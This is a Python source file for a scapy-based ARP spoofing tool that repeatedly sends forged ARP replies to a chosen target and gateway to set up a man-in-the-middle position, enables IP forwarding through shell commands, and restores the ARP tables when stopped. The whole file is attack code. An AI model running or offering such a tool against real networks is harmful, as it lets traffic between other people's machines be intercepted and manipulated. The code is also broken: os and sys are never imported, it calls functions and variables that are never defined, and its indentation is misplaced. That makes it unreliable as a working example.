import scapy.all as scapy
import time

def enable_ip_forwarding():
    print ("\n[*] Enabling IP Forwarding...\n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    print ("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def mitm():
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        disable_ip_forwarding()
        print ("[!] Couldn't Find Victim MAC Address")
        print ("[!] Exiting...")
    sys.exit(1)
    try:
        gatewayMAC = get_mac(gatewayIP)
    except Exception:
        disable_ip_forwarding()
        print ("[!] Couldn't Find Gateway MAC Address")
        print ("[!] Exiting...")
        sys.exit(1)
    
def mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    br = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_br = br / arp_request
    list_1 = scapy.srp(arp_req_br, timeout=5, verbose=False)[0]
    return list_1[0][1].hwsrc

def spoof(targ, spoof):
    packet = scapy.ARP(op=2, pdst=targ, hwdst=mac(targ),
                       psrc=spoof)
    scapy.send(packet, verbose=False)

def reset(dest_ip, src_ip):
    dest_mac = mac(dest_ip)
    source_mac = mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

target_ip = input("[*] Enter Target IP > ")  # Enter your target IP
gateway_ip = input("[*] Enter Gateway IP > ")  # Enter your gateway's IP

try:
    countpackets = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        countpackets = countpackets + 2
        print("\r[*] Packets Sent " + str(countpackets), end="")
        time.sleep(2)  # We testing not crashing servers, Waits for two seconds

except KeyboardInterrupt:
    print("\nCtrl + C pressed............. Quitting. ")
    reset(gateway_ip, target_ip)
    reset(target_ip, gateway_ip)
    print("[*] Arp Spoof Stopped, IP restored. ")

    if __name__ == '__main__':
        enable_ip_forwarding()
        mitm()
